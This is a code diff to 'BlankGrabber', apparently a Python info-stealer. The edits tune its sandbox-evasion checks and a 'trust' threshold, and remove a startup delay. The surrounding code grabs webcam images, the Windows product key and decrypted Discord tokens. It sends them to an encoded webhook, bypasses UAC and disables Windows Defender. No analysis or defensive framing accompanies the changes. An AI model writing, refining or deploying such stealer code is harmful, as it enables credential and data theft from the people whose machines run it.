@@ -99,9 +99,11 @@ class vmprotect:
 
         if os.path.isfile(os.path.join("D:" + os.sep, "TOOLS", "Detonate.exe")):
             fquit()
-
-        if http.request("GET", "http://ip-api.com/line/?fields=hosting").data.decode() == "true":
-            fquit()
+        try:
+            if http.request("GET", "http://ip-api.com/line/?fields=hosting").data.decode() == "true":
+                fquit()
+        except Exception:
+            pass
 
 class BlankGrabber:
     def __init__(self):
@@ -173,7 +175,7 @@ class BlankGrabber:
             img.save(os.path.join(self.tempfolder, "Webcam.png"), "png")
         os.remove(os.path.join(sys._MEIPASS + "Webcam.bmp"))
         os.remove(os.path.join(sys._MEIPASS, "cm.bam"))
-        self.trust += 1
+        self.trust += 2
 
     def getPKey(self):
         key = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode().strip()
@@ -300,7 +302,7 @@ class BlankGrabber:
                                 token = (token[::-1].replace("\\", "", 1))[::-1]
                             if not token in encrypted_tokens:
                                 encrypted_tokens.append(token)
-       
+
             for token in encrypted_tokens:
                 token = decrypt_token(base64.b64decode(token.split("dQw4w9WgXcQ:")[1]), base64.b64decode(key)[5:])
                 if token:
@@ -406,7 +408,7 @@ class BlankGrabber:
   "username": "Blank Grabber",
   "avatar_url": "https://i.imgur.com/ZZZtlwB.png"
 }
-        if self.trust < 3:
+        if self.trust < 2:
             fquit()
         self.webhook = base64.b85decode(self.webhook.encode()).decode()
         self.http.request("POST", self.webhook, body= json.dumps(payload).encode(), headers= self.headers())
@@ -421,7 +423,6 @@ class BlankGrabber:
         os._exit(0)
 
 if __name__ == "__main__":
-    time.sleep(1)
     if not is_admin():
         uac_bypass()
     t = threading.Thread(target= disable_wd)
